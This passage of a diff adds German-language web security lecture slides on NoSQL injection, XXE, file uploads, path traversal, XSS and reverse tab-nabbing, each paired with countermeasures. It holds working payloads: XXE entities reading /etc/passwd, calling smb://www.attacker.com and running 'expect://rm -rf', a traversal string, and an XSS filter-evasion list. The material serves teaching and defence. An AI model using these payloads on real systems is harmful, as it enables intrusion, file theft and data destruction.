+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> obj<span class="op">.</span><span class="at">credits</span> <span class="op">-</span> obj<span class="op">.</span><span class="at">debits</span> <span class="op">&lt;</span> $userInput<span class="op">;</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a>})<span class="op">;;</span></span></code></pre></div>
+</section>
+<section id="nosql-attack-pattern" class="slide level2">
+<h2>NoSQL: Attack pattern</h2>
+<div class="sourceCode" id="cb36"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a># attack<span class="op">:</span> $userInput auf folgenden Wert setzen</span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a>(<span class="kw">function</span>(){<span class="kw">var</span> date <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span> <span class="cf">do</span>{curDate <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span>}<span class="cf">while</span>(curDate<span class="op">-</span>date<span class="op">&lt;</span><span class="dv">10000</span>)<span class="op">;</span> <span class="cf">return</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">max</span>()<span class="op">;</span>})()</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a># schöner formattiert</span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>(<span class="kw">function</span>(){</span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">var</span> date <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span></span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">do</span>{ curDate <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span>}<span class="cf">while</span>(curDate<span class="op">-</span>date<span class="op">&lt;</span><span class="dv">10000</span>)<span class="op">;</span></span>
+<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">max</span>()<span class="op">;</span></span>
+<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a>})()</span></code></pre></div>
+</section></section>
+<section>
+<section id="xml-external-entities" class="title-slide slide level1">
+<h1>XML External Entities</h1>
+
+</section>
+<section id="grundproblem-3" class="slide level2">
+<h2>Grundproblem</h2>
+<ul>
+<li>XML Dateien müssen serverseitig bearbeitet werden</li>
+<li>XML Parser sind komplex</li>
+<li>Es können Remote Ressourcen eingebunden werden</li>
+</ul>
+</section>
+<section id="beispiel-reading-files" class="slide level2">
+<h2>Beispiel: reading files</h2>
+<div class="sourceCode" id="cb37"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;file:///etc/passwd&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-shares" class="slide level2">
+<h2>Beispiel: reading Shares</h2>
+<p>Es werden die Token des Serverbenutzers verwendet.</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;smb://www.attacker.com&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-urls" class="slide level2">
+<h2>Beispiel: reading URLs</h2>
+<div class="sourceCode" id="cb39"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://www.seite-gegen-das-verbotsgesetz.com/text.txt&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-urls-1" class="slide level2">
+<h2>Beispiel: reading URLs</h2>
+<div class="sourceCode" id="cb40"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://192.168.0.1/admin/do-something&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-urls-2" class="slide level2">
+<h2>Beispiel: reading URLs</h2>
+<div class="sourceCode" id="cb41"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://localhost:8080/admin/do-something&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="if-lucky-php-expect-module" class="slide level2">
+<h2>If lucky: PHP Expect Module</h2>
+<div class="sourceCode" id="cb42"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;expect://rm -rf&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xee;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="gegenmaßnahmen-1" class="slide level2">
+<h2>Gegenmaßnahmen</h2>
+<ul>
+<li>JSON/CSV sind keine “wirklichen” Alternativen</li>
+<li>Im Parser External Entities <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">deaktivieren</a></li>
+<li>Wissen, wie der Parser funktioniert..</li>
+</ul>
+</section>
+<section id="million-laughter-attacks" class="slide level2">
+<h2>Million Laughter Attacks</h2>
+<ul>
+<li>DoS-Angriff gegenüber dem Speicher (RAM)</li>
+<li>Meistens über “explodierende” Strukturen</li>
+<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_Security_Cheat_Sheet.md">XML Security Cheat Sheet</a></li>
+</ul>
+</section></section>
+<section>
+<section id="file-uploads" class="title-slide slide level1">
+<h1>File Uploads</h1>
+
+</section>
+<section id="umfeld" class="slide level2">
+<h2>Umfeld</h2>
+<ul>
+<li>Benutzer kann Dateien hochladen</li>
+<li>Benutzer kann Dateien wieder herunterladen bzw. auf Dateien zugreifen</li>
+<li>(Dateien werden server-seitig gelesen)</li>
+</ul>
+</section>
+<section id="das-upload-verzeichnis" class="slide level2">
+<h2>Das Upload-Verzeichnis</h2>
+<ul>
+<li>in diesem Verzeichnis werden Dateien abgelegt</li>
+</ul>
+<table>
+<thead>
+<tr class="header">
+<th>Server-Pfad</th>
+<th>URL</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>/var/www</td>
+<td>http://snikt.net/</td>
+</tr>
+<tr class="even">
+<td>/var/www/index.html</td>
+<td>http://snikt.net/index.html</td>
+</tr>
+<tr class="odd">
+<td>/var/www/upload</td>
+<td>http://snikt.net/upload</td>
+</tr>
+<tr class="even">
+<td>/var/www/upload/1.jpg</td>
+<td>http://snikt.net/upload/1.jpg</td>
+</tr>
+<tr class="odd">
+<td>/var/www/upload/1.html</td>
+<td>http://snikt.net/upload/1.html</td>
+</tr>
+<tr class="even">
+<td>/var/www/upload/1.php</td>
+<td>http://snikt.net/upload/1.php</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="minimale-absicherungen" class="slide level2">
+<h2>Minimale Absicherungen</h2>
+<ul>
+<li>Dateitypen begrenzen (keine HTML-Files, etc.)</li>
+<li>Niemals Dateinamen durch User bestimmen lassen</li>
+<li>Kein Overwrite von Dateien erlauben</li>
+</ul>
+</section>
+<section id="bessere-lösung" class="slide level2">
+<h2>Bessere Lösung</h2>
+<ul>
+<li>Downloads von Applikation trennen
+<ul>
+<li>Download-Verzeichnis ausserhalb des Webroots</li>
+<li>oder BLOBs in der Datenbank</li>
+</ul></li>
+<li>Eigene Download-Operation
+<ul>
+<li>Mit Random-Id</li>
+<li>Mit Authentication/Authorization</li>
+<li>z.B. download.php?id=123</li>
+</ul></li>
+</ul>
+</section>
+<section id="upload-von-html-files" class="slide level2">
+<h2>Upload von HTML Files</h2>
+<ul>
+<li>Wenn ein HTML-File hochgeladen und danach betrachtet wird
+<ul>
+<li>inkludierter JavaScript Code ist same-origin</li>
+<li>Zugriff auf Cookies, etc.</li>
+</ul></li>
+</ul>
+<pre><code>Content-Disposition: attachment
+X-Content-Type-Options: nosniff</code></pre>
+</section>
+<section id="upload-von-indirekt-malicious-files" class="slide level2">
+<h2>Upload von indirekt malicious files</h2>
+<ul>
+<li>Backdoors, z. B. als PDF Dateien</li>
+<li>Integration von Virenscanner?</li>
+</ul>
+</section></section>
+<section>
+<section id="path-traversals" class="title-slide slide level1">
+<h1>Path Traversals</h1>
+
+</section>
+<section id="path-traversals-grundsituation" class="slide level2">
+<h2>Path Traversals: Grundsituation</h2>
+<ul>
+<li>Annahme Operation: /var/www/GetImage.jsp</li>
+<li>https://opfer.local/GetImage.jsp?file=diagram.jpg</li>
+<li>Zugriff auf Datei /var/www/diagram.jpg</li>
+</ul>
+</section>
+<section id="trying-to-get-out-of-webroot" class="slide level2">
+<h2>Trying to get out of WebRoot</h2>
+<pre><code>Parameter: ./../../../../etc/passwd
+/var/www/./../../../../etc/passwd
+-&gt; /etc/passwd</code></pre>
+</section>
+<section id="path-traversals-gegenmaßnahmen" class="slide level2">
+<h2>Path Traversals: Gegenmaßnahmen</h2>
+<ul>
+<li>Nicht benutzer-übergebene Dateinamen beim Zugriff verwenden</li>
+<li>immer den kanonischen Pfad berechnen und gegen eine whitelist testen</li>
+<li>Einsatz von Sandboxes und Chroots</li>
+</ul>
+</section></section>
+<section>
+<section id="client-side-attacks" class="title-slide slide level1">
+<h1>Client-Side Attacks</h1>
+
+</section>
+<section id="angriffe-gegen-den-browser" class="slide level2">
+<h2>Angriffe gegen den Browser</h2>
+<ul>
+<li>häufig als Teil von Social Engingeering</li>
+<li>Water-Hole Attacks</li>
+</ul>
+</section>
+<section id="gegenmassnahme-http-header" class="slide level2">
+<h2>Gegenmassnahme: HTTP-Header</h2>
+<ul>
+<li>Server teilen dem Browser erwartetes Verhalten mit</li>
+<li>HTTP-Header wie Cookie-Header oder HSTS</li>
+<li>teilweise HTML-Directives</li>
+<li>Immer Browser-Versions abhängig, siehe auch <a href="https://caniuse.com/">caniuse</a></li>
+</ul>
+</section></section>
+<section>
+<section id="javascript-injectons-xss" class="title-slide slide level1">
+<h1>Javascript-Injectons (XSS)</h1>
+
+</section>
+<section id="grundproblem-4" class="slide level2">
+<h2>Grundproblem</h2>
+<ul>
+<li>Angreifer findet einen Weg um Javascript innerhalb der Webseite zu platzieren</li>
+<li>Angriff wird im Browser des Opfers durchgeführt, wenn dieser die Webseite betrachtet</li>
+<li>Drei grobe Arten: reflected, persistend, DOM-based XSS</li>
+</ul>
+</section>
+<section id="reflected-xss" class="slide level2">
+<h2>Reflected XSS</h2>
+<img data-src="0x08_reflexted_xss.png" title="fig:" class="stretch" alt="Picture" />
+<ul>
+<li>Javascript wird vom Webserver zurückreflektiert</li>
+<li>non-persistent</li>
+<li>meistens ist eine soziale Komponente notwendig</li>
+<li>http://opfer.xyz/operation?parameter=alert(1);</li>
+</ul>
+</section>
+<section id="storedpersistent-xss" class="slide level2">
+<h2>Stored/Persistent XSS</h2>
+<p>Javascript wird am Server gespeichert</p>
+<p>Z.b. folgendes als Chat-Nachricht:</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="op">;</span><span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+</section>
+<section id="dom-based-xss" class="slide level2">
+<h2>DOM-based XSS</h2>
+<ul>
+<li>DOM-based</li>
+<li>Durch Modifikation/Injecten des Schadcodes im DOM</li>
+<li>Server ist nicht direkt involviert</li>
+</ul>
+</section>
+<section id="beispiel" class="slide level2">
+<h2>Beispiel</h2>
+<p>http://www.some.site/page.html?default=French</p>
+<div class="sourceCode" id="cb46"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;select&gt;&lt;script&gt;</span></span>
+<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">write</span>(<span class="st">&quot;&lt;OPTION value=1&gt;&quot;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">href</span><span class="op">.</span><span class="fu">substring</span>(<span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">href</span><span class="op">.</span><span class="fu">indexOf</span>(<span class="st">&quot;default=&quot;</span>)<span class="op">+</span><span class="dv">8</span>)<span class="op">+</span><span class="st">&quot;&lt;/OPTION&gt;&quot;</span>)<span class="op">;</span></span>
+<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">write</span>(<span class="st">&quot;&lt;OPTION value=2&gt;English&lt;/OPTION&gt;&quot;</span>)<span class="op">;</span></span>
+<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/script&gt;&lt;/select&gt;</span></span></code></pre></div>
+<pre class="url"><code>http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+</section>
+<section id="dom-based-warum-interessant" class="slide level2">
+<h2>DOM-based: warum interessant?</h2>
+<ul>
+<li>Documentation am Server?</li>
+<li>http://snikt.net/app/libs/jquery/docs/search.html</li>
+</ul>
+</section>
+<section id="uxss" class="slide level2">
+<h2>uXSS</h2>
+<p>Angriffe gegen den Browser..</p>
+</section>
+<section id="mxss" class="slide level2">
+<h2>mXSS</h2>
+<p>Browser modifizieren übertragenen Code und “erzeugen” auf diese Weise XSS-verseuchte Webseiten</p>
+<ul>
+<li>z.B. bei Verwendung von X-XSS-Protection</li>
+</ul>
+</section>
+<section id="xss-kann-an-vielen-stellen-auftreten" class="slide level2">
+<h2>XSS kann an vielen Stellen auftreten</h2>
+<div class="sourceCode" id="cb48"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="op">;</span><span class="kw">&lt;/script&gt;</span></span>
+<span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;SCRIPT</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">http://xss.rocks/xss.js</span><span class="kw">&gt;&lt;/SCRIPT&gt;</span></span>
+<span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">JaVaScRiPt:alert(</span><span class="er">&#39;XSS&#39;)</span><span class="kw">&gt;</span></span>
+<span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">`javascript:alert(</span><span class="er">&quot;RSnake</span> <span class="er">says,</span> <span class="er">&#39;XSS&#39;&quot;)`</span><span class="kw">&gt;</span></span>
+<span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb48-7"><a href="#cb48-7" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">javascript:alert(String.fromCharCode(88,83,83))</span><span class="kw">&gt;</span></span>
+<span id="cb48-8"><a href="#cb48-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb48-9"><a href="#cb48-9" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">SRC</span><span class="ot">=</span> <span class="st">onmouseover=</span><span class="er">&quot;alert(&#39;xxs&#39;)&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb48-10"><a href="#cb48-10" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">&quot;non-existant&quot;</span> <span class="er">onerror</span><span class="ot">=</span><span class="st">&quot;alert(&#39;xxs&#39;)&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb48-11"><a href="#cb48-11" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb48-12"><a href="#cb48-12" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;BGSOUND</span> <span class="er">SRC</span><span class="ot">=</span><span class="st">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb48-13"><a href="#cb48-13" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;IMG</span> <span class="er">STYLE</span><span class="ot">=</span><span class="st">&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;</span><span class="kw">&gt;</span></span></code></pre></div>
+</section>
+<section id="payloads" class="slide level2">
+<h2>Payloads</h2>
+<ul>
+<li>Session Stealing</li>
+<li>Virtual Defacement</li>
+<li>Crypto-Mining</li>
+<li><a href="https://de.wikipedia.org/wiki/Low_Orbit_Ion_Cannon">DDoS-Angriffe</a></li>
+<li><a href="https://beefproject.com/">Further Social Engineering</a></li>
+</ul>
+</section>
+<section id="gegenmaßnahme-input-filteringsanitation" class="slide level2">
+<h2>Gegenmaßnahme: Input Filtering/Sanitation</h2>
+<ul>
+<li>werden Daten eingegeben, müssen diese auf Schadmuster hin überprüft werden</li>
+<li>Ist nur sinnvoll mit gemaintainten Bibliotheken durchführbar</li>
+<li>Hardening: Web Application Firewalls (Problem: False-Positives)</li>
+</ul>
+</section>
+<section id="gegenmaßnahme-quoting" class="slide level2">
+<h2>Gegenmaßnahme: Quoting</h2>
+<ul>
+<li>werden user-generierte Daten ausgegeben, müssen diese encoded werden</li>
+<li>“nicht so einfach..”: verschiedene scopes</li>
+<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md">XSS Prevention Cheat Sheet</a></li>
+</ul>
+</section>
+<section id="quoting-kann-komplex-werden" class="slide level2">
+<h2>Quoting kann komplex werden</h2>
+<ul>
+<li>Context ist wichtig, folgendes Code-Fragment am Server</li>
+<li>taintedVar muss sowohl js- als auch html-encoded sein</li>
+</ul>
+<div class="sourceCode" id="cb49"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;</span></span>
+<span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a> <span class="kw">var</span> x <span class="op">=</span> <span class="st">&#39;&lt;%= taintedVar %&gt;&#39;</span><span class="op">;</span></span>
+<span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a> <span class="kw">var</span> d <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="st">&#39;div&#39;</span>)<span class="op">;</span></span>
+<span id="cb49-4"><a href="#cb49-4" aria-hidden="true" tabindex="-1"></a>   d<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> x<span class="op">;</span></span>
+<span id="cb49-5"><a href="#cb49-5" aria-hidden="true" tabindex="-1"></a>   <span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">appendChild</span>(d)<span class="op">;</span></span>
+<span id="cb49-6"><a href="#cb49-6" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+</section>
+<section id="gegenmassnahme-quoting" class="slide level2">
+<h2>Gegenmassnahme Quoting</h2>
+<ul>
+<li>HTML-Renderer vermeiden
+<ul>
+<li>element.write</li>
+<li>element.writeln</li>
+<li>innerHTML</li>
+<li>outerHTML</li>
+</ul></li>
+<li>Bei gewissen Funktionen double-quoting verwenden</li>
+<li>Achtung bei on* Handlern und Quoting</li>
+<li><a href="https://www.owasp.org/images/0/07/Xenotix_XSS_Protection_CheatSheet_For_Developers.pdf">Weiterführende Hints</a></li>
+</ul>
+</section>
+<section id="hardening-x-xss-protection" class="slide level2">
+<h2>Hardening: X-XSS-Protection</h2>
+<ul>
+<li>Aktiviert die XSS Protection des Browsers</li>
+<li>Sollte vor Reflected-XSS schützen</li>
+<li>Werte:
+<ul>
+<li>0: disabled</li>
+<li>1: enabled, input wird sanitized</li>
+<li>1; mode=block: enabled, die page wird nicht gerendert</li>
+</ul></li>
+<li>Anti-XSS Heuristic wird nur noch von IE unterstützt..</li>
+</ul>
+</section>
+<section id="hardening-content-security-policy" class="slide level2">
+<h2>Hardening: Content Security Policy</h2>
+<ul>
+<li>war primär als XSS Schutz gedacht</li>
+<li>script-src Direktiven</li>
+<li>kommen gleich..</li>
+</ul>
+</section>
+<section id="zusammenspiel-der-absicherungen" class="slide level2">
+<h2>Zusammenspiel der Absicherungen</h2>
+<img data-src="0x08_xss_summary.png" title="fig:" class="stretch" alt="Zusammenfassung" />
+</section></section>
+<section>
+<section id="reverse-tab-nabbing" class="title-slide slide level1">
+<h1>Reverse Tab-Nabbing</h1>
+
+</section>
+<section id="grundidee" class="slide level2">
+<h2>GrundIdee</h2>
+<p>Wird ein externer Link in einem neuen Browserfenster/tab aufgemacht, kann die aufgemachte Seite die Location der aufmachenden Seite ändern.</p>
+</section>
+<section id="aufmachende-seite" class="slide level2">
+<h2>Aufmachende Seite</h2>
+<div class="sourceCode" id="cb50"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;html&gt;</span></span>
+<span id="cb50-2"><a href="#cb50-2" aria-hidden="true" tabindex="-1"></a> <span class="kw">&lt;body&gt;</span></span>
+<span id="cb50-3"><a href="#cb50-3" aria-hidden="true" tabindex="-1"></a>   <span class="kw">&lt;li&gt;&lt;a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;bad-website.com&quot;</span> <span class="er">target</span><span class="ot">=</span><span class="st">&quot;_blank&quot;</span><span class="kw">&gt;</span>Vulnerable target using html link to open the new page<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb50-4"><a href="#cb50-4" aria-hidden="true" tabindex="-1"></a>     <span class="kw">&lt;button</span> <span class="er">onclick</span><span class="ot">=</span><span class="st">&quot;window.open(&#39;https://bad-website.com&#39;)&quot;</span><span class="kw">&gt;</span>Vulnerable target using javascript to open the new page<span class="kw">&lt;/button&gt;</span></span>
+<span id="cb50-5"><a href="#cb50-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;/body&gt;</span></span>
+<span id="cb50-6"><a href="#cb50-6" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+</section>
+<section id="angriff-aufgemachte-seite" class="slide level2">
+<h2>Angriff: aufgemachte Seite</h2>
+<div class="sourceCode" id="cb51"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;html&gt;</span></span>
+<span id="cb51-2"><a href="#cb51-2" aria-hidden="true" tabindex="-1"></a> <span class="kw">&lt;body&gt;</span></span>
+<span id="cb51-3"><a href="#cb51-3" aria-hidden="true" tabindex="-1"></a>   <span class="kw">&lt;script&gt;</span></span>
+<span id="cb51-4"><a href="#cb51-4" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> (<span class="bu">window</span><span class="op">.</span><span class="at">opener</span>) {</span>
